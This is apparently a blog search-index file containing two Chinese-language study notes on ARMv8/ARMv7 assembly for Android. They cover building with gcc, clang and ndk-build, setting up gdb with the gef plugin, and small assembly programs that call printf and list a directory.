<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ARMv8学习记录一</title>
    <url>/2020/02/28/ARMv8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E4%B8%80/</url>
    <content><![CDATA[<!-- TOC -->

<ul>
<li><a href="#%E4%BB%8E%E4%B8%80%E4%B8%AA-helloworld-%E5%BC%80%E5%A7%8B">从一个 HelloWorld 开始</a><ul>
<li><a href="#%E4%BD%BF%E7%94%A8-gcc-%E7%BC%96%E8%AF%91">使用 gcc 编译</a></li>
<li><a href="#%E4%BD%BF%E7%94%A8-clang-%E7%BC%96%E8%AF%91">使用 clang 编译</a></li>
<li><a href="#ndk-build-%E7%BC%96%E8%AF%91">ndk-build 编译</a><ul>
<li><a href="#%E6%96%B9%E6%B3%951">方法1：</a></li>
<li><a href="#%E6%96%B9%E6%B3%952">方法2：</a></li>
<li><a href="#%E6%96%B9%E6%B3%953">方法3：</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">调试环境搭建</a><ul>
<li><a href="#%E5%AE%89%E8%A3%85-gef">安装 gef</a></li>
<li><a href="#%E5%AE%89%E8%A3%85%E6%A8%A1%E5%9D%97">安装模块</a></li>
</ul>
</li>
</ul>
<!-- /TOC -->
<h1 id="1-从一个-HelloWorld-开始"><a href="#1-从一个-HelloWorld-开始" class="headerlink" title="1. 从一个 HelloWorld 开始"></a>1. 从一个 HelloWorld 开始</h1><h2 id="1-1-使用-gcc-编译"><a href="#1-1-使用-gcc-编译" class="headerlink" title="1.1. 使用 gcc 编译"></a>1.1. 使用 gcc 编译</h2><p>由于我们主要学习ARMv8的指令，所以直接使用 C 源文件生成一个 ARMv8的汇编源文件。</p>
<p>C 代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hello.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello World!\r\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Makefile 内容如下：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment">#文件名称</span></span><br><span class="line">MODALE_NAME=hello</span><br><span class="line"></span><br><span class="line"><span class="comment">#ndk根目录</span></span><br><span class="line">NDK_ROOT = <span class="variable">$(HOME)</span>/DevTool/AndroidSdk/ndk-bundle</span><br><span class="line"><span class="comment">#编译器根目录</span></span><br><span class="line">TOOLCHAINS_ROOT_ARM=<span class="variable">$(NDK_ROOT)</span>/toolchains/arm-linux-androideabi-4.9/prebuilt/linux-x86_64</span><br><span class="line">TOOLCHAINS_ROOT_AARCH64=<span class="variable">$(NDK_ROOT)</span>/toolchains/aarch64-linux-android-4.9/prebuilt/linux-x86_64</span><br><span class="line"><span class="comment">#编译器目录</span></span><br><span class="line">TOOLCHAINS_PREFIX=<span class="variable">$(TOOLCHAINS_ROOT_ARM)</span>/bin/arm-linux-androideabi</span><br><span class="line">TOOLCHAINS_PREFIX_AARCH64=<span class="variable">$(TOOLCHAINS_ROOT_AARCH64)</span>/bin/aarch64-linux-android</span><br><span class="line"></span><br><span class="line"><span class="comment">#头文件搜索路径</span></span><br><span class="line">TOOLCHAINS_INCLUDE=<span class="variable">$(TOOLCHAINS_ROOT_ARM)</span>/lib/gcc/arm-linux-androideabi/4.9.x/include-fixed</span><br><span class="line">TOOLCHAINS_INCLUDE_AARCH64=<span class="variable">$(TOOLCHAINS_ROOT_AARCH64)</span>/lib/gcc/aarch64-linux-android/4.9.x/include-fixed</span><br><span class="line"></span><br><span class="line"><span class="comment">#SDK根目录</span></span><br><span class="line">PLATFROM_ROOT=<span class="variable">$(NDK_ROOT)</span>/platforms/android-21/arch-arm</span><br><span class="line">PLATFROM_ROOT_AARCH64=<span class="variable">$(NDK_ROOT)</span>/platforms/android-21/arch-arm64</span><br><span class="line"></span><br><span class="line"><span class="comment">#sdk头文件搜索路径</span></span><br><span class="line">PLATFROM_INCLUDE=<span class="variable">$(PLATFROM_ROOT)</span>/usr/<span class="keyword">include</span></span><br><span class="line">PLATFROM_INCLUDE_AARCH64=<span class="variable">$(PLATFROM_ROOT_AARCH64)</span>/usr/<span class="keyword">include</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sdk库文件搜索路径</span></span><br><span class="line">PLATFROM_LIB=<span class="variable">$(PLATFROM_ROOT)</span>/usr/lib</span><br><span class="line">PLATFROM_LIB_AARCH64=<span class="variable">$(PLATFROM_ROOT_AARCH64)</span>/usr/lib</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除</span></span><br><span class="line">RM=del</span><br><span class="line"></span><br><span class="line"><span class="comment">#编译选项</span></span><br><span class="line">FLAGS=-I<span class="variable">$(TOOLCHAINS_INCLUDE)</span> \</span><br><span class="line">      -I<span class="variable">$(PLATFROM_INCLUDE)</span>   \</span><br><span class="line">      -L<span class="variable">$(PLATFROM_LIB)</span> \</span><br><span class="line">      -nostdlib \</span><br><span class="line">      -lgcc \</span><br><span class="line">      -Bdynamic \</span><br><span class="line">      -lc \</span><br><span class="line">      -fPIE</span><br><span class="line"></span><br><span class="line">FLAGS_AARCH64=-I<span class="variable">$(TOOLCHAINS_INCLUDE_AARCH64)</span> \</span><br><span class="line">      -I<span class="variable">$(PLATFROM_INCLUDE_AARCH64)</span>   \</span><br><span class="line">      -L<span class="variable">$(PLATFROM_LIB_AARCH64)</span> \</span><br><span class="line">      -nostdlib \</span><br><span class="line">      -lgcc \</span><br><span class="line">      -Bdynamic \</span><br><span class="line">      -lc \</span><br><span class="line">      -fPIE</span><br><span class="line"></span><br><span class="line"><span class="comment">#所有obj文件</span></span><br><span class="line">OBJS=<span class="variable">$(MODALE_NAME)</span>.o \</span><br><span class="line">     <span class="variable">$(PLATFROM_LIB)</span>/crtbegin_dynamic.o \</span><br><span class="line">     <span class="variable">$(PLATFROM_LIB)</span>/crtend_android.o </span><br><span class="line"></span><br><span class="line">OBJS_AARCH64=<span class="variable">$(MODALE_NAME)</span>64.o \</span><br><span class="line">     <span class="variable">$(PLATFROM_LIB_AARCH64)</span>/crtbegin_dynamic.o \</span><br><span class="line">     <span class="variable">$(PLATFROM_LIB_AARCH64)</span>/crtend_android.o </span><br><span class="line"></span><br><span class="line"><span class="comment">#编译器链接</span></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">	<span class="variable">$(TOOLCHAINS_PREFIX)</span>-gcc <span class="variable">$(FLAGS)</span> -E <span class="variable">$(MODALE_NAME)</span>.c -o <span class="variable">$(MODALE_NAME)</span>.i</span><br><span class="line">	<span class="variable">$(TOOLCHAINS_PREFIX)</span>-gcc <span class="variable">$(FLAGS)</span>  -S <span class="variable">$(MODALE_NAME)</span>.i -o <span class="variable">$(MODALE_NAME)</span>.s</span><br><span class="line">	<span class="variable">$(TOOLCHAINS_PREFIX)</span>-gcc <span class="variable">$(FLAGS)</span> -c <span class="variable">$(MODALE_NAME)</span>.s -o <span class="variable">$(MODALE_NAME)</span>.o</span><br><span class="line">	<span class="variable">$(TOOLCHAINS_PREFIX)</span>-gcc <span class="variable">$(FLAGS)</span> <span class="variable">$(OBJS)</span> -fPIE -pie -o <span class="variable">$(MODALE_NAME)</span></span><br><span class="line"></span><br><span class="line"><span class="section">all64:</span></span><br><span class="line">	<span class="variable">$(TOOLCHAINS_PREFIX_AARCH64)</span>-gcc <span class="variable">$(FLAGS_AARCH64)</span> -E <span class="variable">$(MODALE_NAME)</span>.c -o <span class="variable">$(MODALE_NAME)</span>64.i</span><br><span class="line">	<span class="variable">$(TOOLCHAINS_PREFIX_AARCH64)</span>-gcc <span class="variable">$(FLAGS_AARCH64)</span>  -S <span class="variable">$(MODALE_NAME)</span>64.i -o <span class="variable">$(MODALE_NAME)</span>64.s</span><br><span class="line">	<span class="variable">$(TOOLCHAINS_PREFIX_AARCH64)</span>-gcc <span class="variable">$(FLAGS_AARCH64)</span> -c <span class="variable">$(MODALE_NAME)</span>64.s -o <span class="variable">$(MODALE_NAME)</span>64.o</span><br><span class="line">	<span class="variable">$(TOOLCHAINS_PREFIX_AARCH64)</span>-gcc <span class="variable">$(FLAGS_AARCH64)</span> <span class="variable">$(OBJS_AARCH64)</span> -fPIE -pie -o <span class="variable">$(MODALE_NAME)</span>64</span><br><span class="line"><span class="comment">#删除所有.o文件</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(RM)</span> *.o</span><br><span class="line"><span class="comment">#安装程序到手机</span></span><br><span class="line"><span class="section">install:</span></span><br><span class="line">	adb push <span class="variable">$(MODALE_NAME)</span> /data/local/tmp</span><br><span class="line">	adb shell chmod 755 /data/local/tmp/<span class="variable">$(MODALE_NAME)</span></span><br><span class="line">	adb shell /data/local/tmp/<span class="variable">$(MODALE_NAME)</span> </span><br><span class="line"><span class="section">debug:</span></span><br><span class="line">	adb forward tcp:23946 tcp:23946</span><br><span class="line">	adb shell /data/local/tmp/android_server</span><br><span class="line"></span><br><span class="line"><span class="section">install64:</span></span><br><span class="line">	adb push <span class="variable">$(MODALE_NAME)</span>64 /data/local/tmp</span><br><span class="line">	adb shell chmod 755 /data/local/tmp/<span class="variable">$(MODALE_NAME)</span>64</span><br><span class="line">	adb shell /data/local/tmp/<span class="variable">$(MODALE_NAME)</span>64 </span><br><span class="line"></span><br><span class="line"><span class="section">debug64:</span></span><br><span class="line">	adb forward tcp:23946 tcp:23946</span><br><span class="line">	adb shell /data/local/tmp/android_server64</span><br><span class="line"><span class="comment">#运行程序</span></span><br><span class="line"><span class="section">run:</span></span><br><span class="line">	adb shell /data/local/tmp/<span class="variable">$(MODALE_NAME)</span>  </span><br><span class="line"></span><br><span class="line"><span class="section">run64:</span></span><br><span class="line">	adb shell /data/local/tmp/<span class="variable">$(MODALE_NAME)</span>64 </span><br></pre></td></tr></table></figure>
<p>使用 <code>make all64</code> 命令编译后的结果：</p>
<img src="/2020/02/28/ARMv8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E4%B8%80/2020-02-28-23-37-24.png" class="">

<p>运行结果如下：</p>
<img src="/2020/02/28/ARMv8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E4%B8%80/2020-02-28-23-39-35.png" class="">

<p>生成的文件如下：</p>
<img src="/2020/02/28/ARMv8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E4%B8%80/2020-02-28-23-41-48.png" class="">

<p><code>hello64.s</code> 对应的内容，后面所有的指令学习将一次文件为基础进行修改。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	.cpu generic+fp+simd</span><br><span class="line">	.file	&quot;hello.c&quot;</span><br><span class="line">	.section	.rodata</span><br><span class="line">	.align	3</span><br><span class="line">.LC0:</span><br><span class="line">	.string	&quot;Hello World!\r&quot;</span><br><span class="line">	.text</span><br><span class="line">	.align	2</span><br><span class="line">	.global	main</span><br><span class="line">	.type	main, %function</span><br><span class="line">main:</span><br><span class="line">	stp	x29, x30, [sp, -32]!</span><br><span class="line">	add	x29, sp, 0</span><br><span class="line">	str	w0, [x29,28]</span><br><span class="line">	str	x1, [x29,16]</span><br><span class="line">	adrp	x0, .LC0</span><br><span class="line">	add	x0, x0, :lo12:.LC0</span><br><span class="line">	bl	puts</span><br><span class="line">	mov	w0, 0</span><br><span class="line">	ldp	x29, x30, [sp], 32</span><br><span class="line">	ret</span><br><span class="line">	.size	main, .-main</span><br><span class="line">	.ident	&quot;GCC: (GNU) 4.9.x 20150123 (prerelease)&quot;</span><br><span class="line">	.section	.note.GNU-stack,&quot;&quot;,%progbits</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>至此，已经从一个 HelloWorld 开始了 ARMv8 的旅程。</p>
<h2 id="使用-clang-编译"><a href="#使用-clang-编译" class="headerlink" title="使用 clang 编译"></a>使用 clang 编译</h2><p>首先使用 <code>which</code> 命令查看 clang 的位置，由于我没有将 clang 添加到环境变量，最终结果是找不到的，那么需要将 clang 添加到临时环境变量中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;<span class="variable">$ANDROID_HOME</span>/ndk/21.0.6113669/toolchains/llvm/prebuilt/linux-x86_64/bin/:<span class="variable">$PATH</span>&quot;</span> </span><br></pre></td></tr></table></figure>

<p>然后参考NDK 官方指南 <a href="https://developer.android.com/ndk/guides/other_build_systems">将 NDK 与其他构建系统配合使用</a> 部分，可以知道调用 Clang 时需要使用 <code>-target</code> 参数传递适当的目标，例如以下命令为编译 minSdkVersion 为 21 的 64 位 Android ARM 平台的应用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  clang -target aarch64-linux-android21 hello.c -o hello</span><br><span class="line">➜  file hello</span><br><span class="line">hello: ELF 64-bit LSB shared object, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /system/bin/linker64, not stripped</span><br></pre></td></tr></table></figure>

<p>以上命令为一步编译成功，实际过程可以分为三步，我们以 ARM 平台为例进行讲解。</p>
<ol>
<li>预处理</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  clang -target arm-linux-android21 -E hello.c -o arm_hello.i</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>编译成汇编文件</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  clang -target arm-linux-android21 -S arm_hello.i -o arm_hello.s</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>汇编成 obj 文件</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  clang -target arm-linux-android21 -c arm_hello.s -o arm_hello.o</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>链接成可执行程序</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  clang -target arm-linux-android21 arm_hello.o -o arm_hello</span><br></pre></td></tr></table></figure>

<p>编写 makefile 执行 arm_hello</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># make host=aarch64</span></span><br><span class="line">host=arm</span><br><span class="line"><span class="keyword">ifeq</span> (<span class="variable">$(OS)</span>, Windows_NT)</span><br><span class="line">	PLATFORM=windows</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	PLATFORM=linux</span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line">CC=<span class="variable">$(ANDROID_NDK)</span>/toolchains/llvm/prebuilt/<span class="variable">$(PLATFORM)</span>-x86_64/bin/clang</span><br><span class="line"><span class="section">all:</span></span><br><span class="line">	<span class="variable">$(CC)</span> -target <span class="variable">$(host)</span>-linux-android21 -E hello.c -o <span class="variable">$(host)</span>_hello.i</span><br><span class="line">	<span class="variable">$(CC)</span> -target <span class="variable">$(host)</span>-linux-android21 -S <span class="variable">$(host)</span>_hello.i -o <span class="variable">$(host)</span>_hello.s</span><br><span class="line">	<span class="variable">$(CC)</span> -target <span class="variable">$(host)</span>-linux-android21 -c <span class="variable">$(host)</span>_hello.s -o <span class="variable">$(host)</span>_hello.o</span><br><span class="line">	<span class="variable">$(CC)</span> -target <span class="variable">$(host)</span>-linux-android21 <span class="variable">$(host)</span>_hello.o -o <span class="variable">$(host)</span>_hello</span><br><span class="line"></span><br><span class="line"><span class="section">install:</span></span><br><span class="line">	adb push <span class="variable">$(host)</span>_hello /data/local/tmp/<span class="variable">$(host)</span>_hello</span><br><span class="line">	adb shell chmod +x /data/local/tmp/<span class="variable">$(host)</span>_hello</span><br><span class="line"></span><br><span class="line"><span class="section">run:</span></span><br><span class="line">	adb shell /data/local/tmp/<span class="variable">$(host)</span>_hello</span><br><span class="line"></span><br><span class="line">.PHONY : clean</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	-rm -f *.o *.i *.s <span class="variable">$(host)</span>_hello</span><br></pre></td></tr></table></figure>

<h2 id="ndk-build-编译"><a href="#ndk-build-编译" class="headerlink" title="ndk-build 编译"></a>ndk-build 编译</h2><h3 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h3><ol>
<li><p>创建一个空文件<code>AndroidManifest.xml</code>。</p>
</li>
<li><p>创建一个<code>Application.mk</code>，内容如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">APP_BUILD_SCRIPT := Android.mk</span><br><span class="line">APP_PLATFORM := android-21</span><br></pre></td></tr></table></figure></li>
<li><p>创建一个<code>Android.mk</code>文件，内容如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOCAL_PATH := $(call my-dir)</span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line">LOCAL_SRC_FILES := foo.c</span><br><span class="line">LOCAL_MODULE := foo</span><br><span class="line">include $(BUILD_EXECUTABLE)</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用以下命令编译</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ndk-build NDK_APPLICATION_MK=$(pwd)/Application.mk</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h3><p>直接使用以下命令进行编译：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ndk-build NDK_PROJECT_PATH=$(pwd)</span><br><span class="line">或</span><br><span class="line">ndk-build NDK_PROJECT_PATH=$(pwd) APP_BUILD_SCRIPT=$(pwd)/Android.mk</span><br></pre></td></tr></table></figure>

<h3 id="方法3："><a href="#方法3：" class="headerlink" title="方法3："></a>方法3：</h3><p>将所有的文件放入  jni 目录，进入jni目录直接使用 ndk-build 命令编译即可。</p>
<h1 id="2-调试环境搭建"><a href="#2-调试环境搭建" class="headerlink" title="2. 调试环境搭建"></a>2. 调试环境搭建</h1><p>IDA的调试环境就不说了，网上一大把，下面主要说明使用 gdb + gef 的调试环境搭建。</p>
<h2 id="2-1-安装-gef"><a href="#2-1-安装-gef" class="headerlink" title="2.1. 安装 gef"></a>2.1. 安装 gef</h2><p>进入 android gdb 的目录 <code>/ndk-bundle/prebuilt/linux-x86_64/bin</code>,启动命令行，执行下列命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -q -O .gdbinit-gef.py https://github.com/hugsy/gef/raw/master/gef.py</span><br><span class="line">echo source .gdbinit-gef.py &gt;&gt; .gdbinit</span><br></pre></td></tr></table></figure>
<p>然后执行 <code>./gdb</code> 命令，出现如下信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GNU gdb (GDB) 7.11</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</span><br><span class="line">and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;.</span><br><span class="line">GEF for linux ready, type `gef&#x27; to start, `gef config&#x27; to configure</span><br><span class="line">78 commands loaded for GDB 7.11 using Python engine 2.7</span><br><span class="line">[*] 2 commands could not be loaded, run `gef missing` to know why.</span><br><span class="line">gef&gt; gef missing </span><br><span class="line">[*] Command `assemble` is missing, reason -&gt; Missing `keystone-engine` package for Python2, install with: `pip2 install keystone-engine`.</span><br><span class="line">[*] Command `set-permission` is missing, reason -&gt; Missing `keystone-engine` package for Python2, install with: `pip2 install keystone-engine`.</span><br></pre></td></tr></table></figure>
<p>根据提示可以发现缺少了 <code>keystone-engine</code> 模块，当然还有可能缺少其他模块。</p>
<p><strong>后面的内容可以省略，安装过程中会出现比较多的问题，模块不安装也不影响使用。</strong></p>
<hr>
<h2 id="2-2-安装模块"><a href="#2-2-安装模块" class="headerlink" title="2.2. 安装模块"></a>2.2. 安装模块</h2><p>退出 <code>gdb</code> , 下载 <code>[ez_setup.py](https://bootstrap.pypa.io/ez_setup.py)</code> ，运行列命令，进 行 <code>easy_install</code> 工具的安装：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./python ez_setup.py</span><br></pre></td></tr></table></figure>
<p>安装成功之后就可以使用 <code>easy_install</code> 进行安装 <code>package</code> 了，然后根据提示安装需要的模块，也可以利用 <code>easy_install</code> 先安装 <code>pip</code>, 然后在利用 <code>pip</code> 进行安装其他模块，这里我使用 <code>easy_install</code> 进行安装其他模块。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./easy_install keystone-engine</span><br></pre></td></tr></table></figure>
<p>安装完 <code>keystone-engine</code> 后，发现还是会有同样的提示，此时就需要下载 <code>[keystone-engine](https://pypi.org/project/keystone-engine/)</code> 源码进行安装。将源码解压至当前 <code>gdb</code> 的目录 <code>keystone-engine</code>中，运行下列命令进行安装：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd keystone-engine</span><br><span class="line">../python setup.py install</span><br></pre></td></tr></table></figure>
<p>然后再次运行 gdb, 结果如下图：</p>
<img src="/2020/02/28/ARMv8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E4%B8%80/2020-02-29-21-33-08.png" class="">

<img src="/2020/02/28/ARMv8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E4%B8%80/2020-02-29-21-41-36.png" class="">

<p>至此，我们的环境就配好了，这里可以配合 <a href="https://bbs.pediy.com/thread-257344.htm">Hyperpwn</a> 这个工具使用。</p>
<img src="/2020/02/28/ARMv8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E4%B8%80/2020-02-29-21-42-00.png" class="">

<p>参考： </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://medium.com/bugbountywriteup/pwndbg-gef-peda-one-for-all-and-all-for-one-714d71bf36b8</span><br><span class="line">https://packmad.github.io/gdb-android/</span><br><span class="line">https://o0xmuhe.github.io/2016/06/29/install-gef/</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ARMv8汇编</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>ARMv8学习记录三</title>
    <url>/2020/03/16/ARMv8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E4%B8%89/</url>
    <content><![CDATA[<h1 id="ARMv7-汇编"><a href="#ARMv7-汇编" class="headerlink" title="ARMv7 汇编"></a>ARMv7 汇编</h1><p>首先将 clang 添加到临时环境变量中，方便后面使用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ <span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$ANDROID_HOME</span>/ndk/21.0.6113669/toolchains/llvm/prebuilt/linux-x86_64/bin </span><br></pre></td></tr></table></figure>
<h2 id="调用-printf-函数"><a href="#调用-printf-函数" class="headerlink" title="调用 printf 函数"></a>调用 printf 函数</h2><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">    <span class="meta">.text</span></span><br><span class="line">    .globl	main                    <span class="comment">@ -- Begin function main</span></span><br><span class="line">    <span class="meta">.align</span>	<span class="number">2</span></span><br><span class="line"><span class="symbol">main:</span></span><br><span class="line">    <span class="keyword">push</span> &#123;<span class="built_in">lr</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">ldr</span> <span class="built_in">r0</span>, [<span class="built_in">r1</span>]                      <span class="comment">@ 输出 argv[0]</span></span><br><span class="line">    <span class="keyword">bl</span> printf</span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="number">#0</span></span><br><span class="line">    <span class="keyword">pop</span> &#123;<span class="built_in">lr</span>&#125;</span><br><span class="line">    <span class="keyword">bx</span> <span class="built_in">lr</span></span><br></pre></td></tr></table></figure>
<p>以上代码主要作用就是输出第一个参数，编译运行结果如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">clang -target arm-linux-android21 hello.s -o arm_hello</span><br><span class="line">adb push arm_hello /data/local/tmp/arm_hello</span><br><span class="line">adb shell <span class="built_in">chmod</span> +x /data/local/tmp/arm_hello</span><br><span class="line">adb shell /data/local/tmp/arm_hello</span><br><span class="line">/data/local/tmp/arm_hello%</span><br></pre></td></tr></table></figure>
<h2 id="实现-ls-功能"><a href="#实现-ls-功能" class="headerlink" title="实现 ls 功能"></a>实现 ls 功能</h2><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">    <span class="meta">.text</span></span><br><span class="line">    .globl	main                    <span class="comment">@ -- Begin function main</span></span><br><span class="line">    <span class="meta">.align</span>	<span class="number">2</span></span><br><span class="line"><span class="symbol">main:</span></span><br><span class="line">    <span class="keyword">push</span> &#123;<span class="built_in">r4</span>, <span class="built_in">r5</span>, <span class="built_in">lr</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">ldr</span> <span class="built_in">r0</span>, [<span class="built_in">r1</span>, <span class="number">#4</span>]</span><br><span class="line">    <span class="keyword">bl</span> opendir</span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">r0</span>, <span class="number">#0</span></span><br><span class="line">    <span class="keyword">beq</span> .LABEL_EXIT</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r4</span>, <span class="built_in">r0</span>          <span class="comment">@ r4保存返回值</span></span><br><span class="line">    <span class="keyword">bl</span> readdir</span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">r0</span>, <span class="number">#0</span></span><br><span class="line">    <span class="keyword">beq</span> .LABEL_CLOSE_DIR</span><br><span class="line"></span><br><span class="line">    <span class="keyword">ldr</span> <span class="built_in">r5</span>, .formart_str_</span><br><span class="line"><span class="symbol">.LABEL0:</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">r5</span>, <span class="built_in">pc</span>, <span class="built_in">r5</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">.LOOP_READDIR:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">r1</span>, <span class="built_in">r0</span>, <span class="number">#0x13</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="built_in">r5</span></span><br><span class="line">    <span class="keyword">bl</span> printf</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="built_in">r4</span></span><br><span class="line">    <span class="keyword">bl</span> readdir</span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">r0</span>, <span class="number">#0</span></span><br><span class="line">    <span class="keyword">bne</span> .LOOP_READDIR</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="symbol">.LABEL_CLOSE_DIR:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="built_in">r4</span></span><br><span class="line">    <span class="keyword">bl</span> closedir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="symbol">.LABEL_EXIT:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="number">#0</span></span><br><span class="line">    <span class="keyword">pop</span> &#123;<span class="built_in">r4</span>, <span class="built_in">r5</span>, <span class="built_in">lr</span>&#125;</span><br><span class="line">    <span class="keyword">bx</span> <span class="built_in">lr</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">.formart_str_:</span></span><br><span class="line">    <span class="meta">.long</span> .formart_str-(.LABEL0 + <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="symbol">.formart_str:</span></span><br><span class="line">    <span class="meta">.asciz</span> <span class="string">&quot;%s\r\n&quot;</span>     <span class="comment">@ 表示定义一个以0结尾的字符串， ascii 表示定义一个不以0结尾的字符串</span></span><br></pre></td></tr></table></figure>
<p>以上代码实现了简单的 <code>ls</code> 功能，我们给定参数为 <code>/sdcard</code> ，编译运行结果如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">clang -target arm-linux-android21 arm_ls.s -o arm_ls</span><br><span class="line">adb push arm_ls /data/local/tmp/arm_ls</span><br><span class="line">adb shell <span class="built_in">chmod</span> +x /data/local/tmp/arm_ls</span><br><span class="line">adb shell /data/local/tmp/arm_ls /sdcard</span><br><span class="line">.</span><br><span class="line">Podcasts</span><br><span class="line">fart</span><br><span class="line">Notifications</span><br><span class="line">..</span><br><span class="line">Alarms</span><br><span class="line">Ringtones</span><br><span class="line">Download</span><br><span class="line">Android</span><br><span class="line">Movies</span><br><span class="line">DCIM</span><br><span class="line">Pictures</span><br><span class="line">Music</span><br></pre></td></tr></table></figure>

<h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><p>ARMv7 系统调用使用 <code>R7</code> 保存系统调用号，<code>R0</code> 保存返回结果，<code>R0-R6</code> 保存参数。详细信息可以使用 <code>man syscall</code> 查看文档。</p>
